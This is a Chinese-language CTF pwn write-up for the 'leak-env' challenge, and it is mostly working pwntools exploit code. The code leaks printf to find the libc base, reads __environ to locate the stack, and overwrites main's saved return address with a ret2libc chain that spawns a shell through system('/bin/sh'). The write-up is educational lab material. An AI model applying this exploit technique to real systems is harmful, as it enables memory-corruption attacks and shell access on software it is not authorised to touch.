# leak-env

## 题目简述

程序先泄露 `&printf`，随后提供一次任意地址读取 8 字节和一次任意地址写入 `0x30` 字节。由 `printf` 地址可计算配套 libc 基址；libc 的 `__environ` 全局变量保存当前进程环境指针，其值位于主线程栈上，可作为定位 `main` 返回地址的锚点。

## 解题过程

第一行泄露减去 libc 中 `printf` 的符号偏移得到基址。把任意读目标设为 `__environ`，读取其保存的栈地址：

```python
from pwn import *

context(arch="amd64", os="linux")
io = process("../dist/leakenv")
libc = ELF("../dist/libc.so.6")

io.recvuntil(b"Here's your gift: ")
printf_addr = int(io.recvline().strip(), 16)
libc.address = printf_addr - libc.sym["printf"]

io.sendlineafter(b"read?", hex(libc.sym["__environ"]).encode())
io.recvuntil(b"Here you are: ")
stack_anchor = u64(io.recvn(8))
```

在题目提供的容器/libc 中用 GDB 比较 `*(void **)__environ` 与 `main` 保存返回地址，可得本版本差值为 `0x100`。ASLR 会整体移动栈，但同一调用路径内的相对差值保持不变：

```python
saved_rip = stack_anchor - 0x100
```

最后把任意写落到保存返回地址，写入一个不超过 `0x30` 字节的 ret2libc 链：

```python
rop = ROP(libc)
ret = rop.find_gadget(["ret"]).address
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
bin_sh = next(libc.search(b"/bin/sh\x00"))

payload = flat(ret, pop_rdi, bin_sh, libc.sym["system"])
assert len(payload) <= 0x30

io.sendlineafter(b"it?", hex(saved_rip).encode())
io.sendafter(b"it.\n", payload)
io.interactive()
```

开头的单独 `ret` 用于满足 x86-64 ABI 的 16 字节栈对齐。若附件或运行环境改变，必须重新测量 `0x100`，不能把它视为 libc 的固定常数。

## 方法总结

`__environ` 是从 libc 地址空间到栈地址空间的常用桥梁。完整利用链是“函数泄露定位 libc—读取 environ 定位栈—测量相对偏移定位返回地址—任意写布置 ROP”；其中 libc 版本和栈偏移都必须与目标环境严格匹配。
